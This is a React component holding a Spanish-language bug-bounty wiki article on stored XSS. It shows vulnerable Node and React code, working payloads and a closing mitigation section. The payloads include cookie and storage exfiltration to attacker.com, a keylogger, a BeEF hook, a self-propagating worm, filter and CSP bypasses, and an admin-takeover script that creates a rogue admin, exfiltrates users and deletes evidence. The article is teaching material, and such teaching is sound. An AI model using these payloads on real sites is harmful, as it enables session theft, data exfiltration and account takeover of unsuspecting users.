/**
 * XSS STORED
 * Cross-Site Scripting persistente en base de datos
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Code2, AlertTriangle, Shield, Database, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function XSSStoredContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="XSS Stored - El Más Peligroso">
        <Paragraph>
          <Strong>Stored XSS (Persistent XSS)</Strong> ocurre cuando input malicioso se guarda en la 
          base de datos y se ejecuta cada vez que alguien accede a la página. A diferencia del XSS 
          reflejado, este <Strong>NO requiere que la víctima haga clic en un link</Strong>.
        </Paragraph>

        <AlertDanger title="Impacto Crítico">
          <ul className="mt-2 space-y-1">
            <ListItem>🎯 Afecta a TODOS los usuarios que ven el contenido</ListItem>
            <ListItem>🔐 Robo masivo de cookies de sesión</ListItem>
            <ListItem>👤 Defacement permanente del sitio</ListItem>
            <ListItem>🎣 Instalación de keyloggers persistentes</ListItem>
            <ListItem>💉 Worms de XSS auto-propagables</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="ejemplo-vulnerable" title="1. Código Vulnerable Clásico">
        <Subsection title="Backend Sin Sanitización">
          <CodeBlock
            language="javascript"
            title="Node.js - Guardar comentario sin validación"
            code={`app.post('/api/comments', async (req, res) => {
  const { postId, userId, comment } = req.body;
  
  // ❌ VULNERABLE - Guardar input directo sin sanitizar
  await db.comments.create({
    post_id: postId,
    user_id: userId,
    content: comment,  // ← Sin validación ni escape
    created_at: new Date()
  });
  
  res.json({ success: true });
});`}
          />
        </Subsection>

        <Subsection title="Frontend Renderiza Sin Escape">
          <CodeBlock
            language="jsx"
            title="React - Código vulnerable"
            code={`function CommentsList({ comments }) {
  return (
    <div>
      {comments.map(comment => (
        <div key={comment.id}>
          <p className="author">{comment.username}</p>
          {/* ❌ VULNERABLE - dangerouslySetInnerHTML sin sanitizar */}
          <div dangerouslySetInnerHTML={{ __html: comment.content }} />
        </div>
      ))}
    </div>
  );
}`}
          />
        </Subsection>

        <Subsection title="Payload Básico">
          <CodeBlock
            language="html"
            title="Comentario malicioso"
            code={`<script>
  // Robar cookie de sesión
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

<p>Gran artículo! 👍</p>`}
          />

          <AlertWarning>
            Cuando cualquier usuario vea esta página, su cookie se enviará al atacante.
          </AlertWarning>
        </Subsection>
      </Section>

      <Section id="payloads-avanzados" title="2. Payloads Avanzados">
        <Subsection title="Keylogger Persistente">
          <CodeBlock
            language="html"
            title="Payload - Capturar TODO lo que escriben"
            code={`<script>
document.addEventListener('keypress', function(e) {
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: JSON.stringify({
      key: e.key,
      page: window.location.href,
      timestamp: new Date()
    })
  });
});
</script>

<p>Interesante punto de vista</p>`}
          />
        </Subsection>

        <Subsection title="Cookie Stealer con Bypass de HttpOnly">
          <CodeBlock
            language="html"
            title="Payload - Robar datos aunque HttpOnly esté activo"
            code={`<script>
// HttpOnly previene acceso a document.cookie, pero no a localStorage/sessionStorage
const data = {
  url: window.location.href,
  localStorage: JSON.stringify(localStorage),
  sessionStorage: JSON.stringify(sessionStorage),
  // Capturar CSRF token del DOM
  csrfToken: document.querySelector('[name="csrf-token"]')?.content,
  // Capturar datos de formularios
  forms: Array.from(document.forms).map(f => ({
    action: f.action,
    inputs: Array.from(f.elements).map(e => ({
      name: e.name,
      value: e.value
    }))
  }))
};

fetch('https://attacker.com/exfil', {
  method: 'POST',
  body: JSON.stringify(data)
});
</script>`}
          />
        </Subsection>

        <Subsection title="BeEF Hook - Control Total del Browser">
          <CodeBlock
            language="html"
            title="Payload - Conectar a BeEF Framework"
            code={`<script src="https://attacker.com/hook.js"></script>

<!-- Cuando la víctima carga la página, su browser se conecta
     al panel de control de BeEF del atacante, permitiendo:
     - Ejecutar comandos JavaScript arbitrarios
     - Capturar screenshots
     - Activar webcam/micrófono (con permisos)
     - Redirigir a phishing
     - Escanear red interna
-->`}
          />
        </Subsection>

        <Subsection title="XSS Worm Auto-Propagable">
          <CodeBlock
            language="html"
            title="Payload - Worm estilo Samy (MySpace 2005)"
            code={`<script>
async function propagate() {
  // Obtener lista de amigos/seguidores
  const response = await fetch('/api/friends');
  const friends = await response.json();
  
  // Mensaje malicioso
  const payload = \`
    <script src="https://attacker.com/worm.js"><\\/script>
    <p>¡Mira esto! 🔥</p>
  \`;
  
  // Enviar mensaje a todos los amigos
  for (const friend of friends) {
    await fetch('/api/messages', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        to: friend.id,
        message: payload
      })
    });
  }
}

propagate();
</script>`}
          />

          <AlertDanger>
            Este tipo de worm se auto-propaga a TODOS los contactos de cada víctima, 
            causando infección masiva en minutos.
          </AlertDanger>
        </Subsection>
      </Section>

      <Section id="bypass-filtros" title="3. Bypass de Filtros WAF">
        <Subsection title="Bypass de Blacklist de <script>">
          <CodeBlock
            language="html"
            title="Técnicas alternativas sin <script>"
            code={`<!-- Event handlers -->
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">

<!-- SVG con JavaScript -->
<svg onload="alert(document.domain)">

<!-- iframe srcdoc -->
<iframe srcdoc="<script>alert(1)<\/script>">

<!-- HTML5 autofocus -->
<input autofocus onfocus="fetch('https://attacker.com/?c='+document.cookie)">

<!-- Base64 encoding -->
<img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tLz9jPScrZG9jdW1lbnQuY29va2llKQ=='))">

<!-- Unicode bypass -->
<img src=x onerror="\\u0066\\u0065\\u0074\\u0063\\u0068('https://attacker.com')">

<!-- HTML entities -->
<img src=x onerror="&#102;&#101;&#116;&#99;&#104;('https://attacker.com')">`}
          />
        </Subsection>

        <Subsection title="Bypass de CSP (Content Security Policy)">
          <CodeBlock
            language="html"
            title="Explotar CSP mal configurado"
            code={`<!-- Si CSP permite 'unsafe-inline' -->
<img src=x onerror="alert(1)">

<!-- Si CSP permite un CDN específico -->
<script src="https://allowed-cdn.com/jquery.js"></script>
<script>
  // jQuery ya cargado, abusarlo
  $.getScript('https://attacker.com/evil.js');
</script>

<!-- Si CSP permite data: URIs -->
<script src="data:text/javascript,fetch('https://attacker.com/?c='+document.cookie)"></script>

<!-- JSONP endpoint abuse -->
<!-- Si CSP permite https://api.example.com -->
<script src="https://api.example.com/jsonp?callback=fetch('https://attacker.com')//"></script>`}
          />
        </Subsection>
      </Section>

      <Section id="explotacion-real" title="4. Caso Real: Admin Panel Takeover">
        <Subsection title="Escenario">
          <Paragraph>
            Una aplicación de tickets de soporte permite a usuarios adjuntar "notas" que 
            los administradores ven al revisar tickets.
          </Paragraph>
        </Subsection>

        <Subsection title="Paso 1: Crear Ticket con Payload">
          <CodeBlock
            language="json"
            title="POST /api/tickets"
            code={`{
  "subject": "Problema con mi cuenta",
  "description": "No puedo acceder",
  "internal_note": "<script src='https://attacker.com/admin-pwn.js'></script>"
}`}
          />
        </Subsection>

        <Subsection title="Paso 2: Script Malicioso (admin-pwn.js)">
          <CodeBlock
            language="javascript"
            title="admin-pwn.js - Crear cuenta admin"
            code={`(async function() {
  // Verificar que estamos en panel de admin
  if (!window.location.pathname.includes('/admin')) {
    return;
  }
  
  // Crear cuenta de atacante como admin
  await fetch('/admin/api/users', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': document.querySelector('[name=csrf-token]').content
    },
    body: JSON.stringify({
      username: 'hacker',
      password: 'pwned123!',
      email: 'hacker@evil.com',
      role: 'admin'
    })
  });
  
  // Exfiltrar lista de todos los usuarios
  const users = await fetch('/admin/api/users').then(r => r.json());
  
  await fetch('https://attacker.com/loot', {
    method: 'POST',
    body: JSON.stringify(users)
  });
  
  // Ocultar evidencia: borrar el ticket
  await fetch(\`/admin/api/tickets/\${getTicketId()}\`, {
    method: 'DELETE'
  });
})();`}
          />

          <AlertWarning>
            Cuando el admin abre el ticket, el script se ejecuta con sus permisos, 
            creando una cuenta admin para el atacante.
          </AlertWarning>
        </Subsection>
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ Defensa en Profundidad">
          Implementar TODAS estas capas de seguridad:
        </AlertDanger>

        <Subsection title="1. Sanitización en Backend">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - DOMPurify en Node.js"
            code={`const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

app.post('/api/comments', async (req, res) => {
  const { postId, userId, comment } = req.body;
  
  // ✅ SEGURO - Sanitizar HTML
  const sanitizedComment = DOMPurify.sanitize(comment, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'li'],
    ALLOWED_ATTR: ['href'],
    ALLOW_DATA_ATTR: false
  });
  
  await db.comments.create({
    post_id: postId,
    user_id: userId,
    content: sanitizedComment,
    created_at: new Date()
  });
  
  res.json({ success: true });
});`}
          />
        </Subsection>

        <Subsection title="2. Escape en Frontend (React)">
          <CodeBlock
            language="jsx"
            title="✅ SEGURO - Usar textContent en lugar de innerHTML"
            code={`import DOMPurify from 'isomorphic-dompurify';

function CommentsList({ comments }) {
  return (
    <div>
      {comments.map(comment => (
        <div key={comment.id}>
          <p className="author">{comment.username}</p>
          
          {/* ✅ SEGURO - Sanitizar antes de renderizar */}
          <div 
            dangerouslySetInnerHTML={{ 
              __html: DOMPurify.sanitize(comment.content, {
                ALLOWED_TAGS: ['p', 'b', 'i', 'a'],
                ALLOWED_ATTR: ['href']
              })
            }} 
          />
        </div>
      ))}
    </div>
  );
}

// ✅ Aún más seguro: Solo texto plano
function SafeComment({ content }) {
  return <p>{content}</p>;  // React escapa automáticamente
}`}
          />
        </Subsection>

        <Subsection title="3. Content Security Policy Estricto">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - CSP header robusto"
            code={`const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: [
      "'self'",
      // NO usar 'unsafe-inline' ni 'unsafe-eval'
    ],
    styleSrc: ["'self'", "'unsafe-inline'"],  // Styles son menos peligrosos
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    mediaSrc: ["'self'"],
    frameSrc: ["'none'"],
    baseUri: ["'self'"],
    formAction: ["'self'"],
    upgradeInsecureRequests: []
  }
}));`}
          />
        </Subsection>

        <Subsection title="4. HttpOnly + Secure Cookies">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Cookies inaccesibles desde JavaScript"
            code={`app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    httpOnly: true,   // ✅ No accesible desde JavaScript
    secure: true,     // ✅ Solo HTTPS
    sameSite: 'strict' // ✅ Prevenir CSRF
  }
}));`}
          />
        </Subsection>

        <Subsection title="5. Validación de Input con Schema">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Joi validation"
            code={`const Joi = require('joi');

const commentSchema = Joi.object({
  postId: Joi.number().required(),
  userId: Joi.number().required(),
  comment: Joi.string()
    .max(500)
    .pattern(/^[a-zA-Z0-9\\s.,!?áéíóúñÑ]+$/)  // Solo texto seguro
    .required()
});

app.post('/api/comments', async (req, res) => {
  // ✅ Validar estructura
  const { error, value } = commentSchema.validate(req.body);
  
  if (error) {
    return res.status(400).json({ error: error.details[0].message });
  }
  
  // ... guardar comentario
});`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: XSS DOM-Based</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/xss-dom-based`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>XSS basado en manipulación del DOM</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
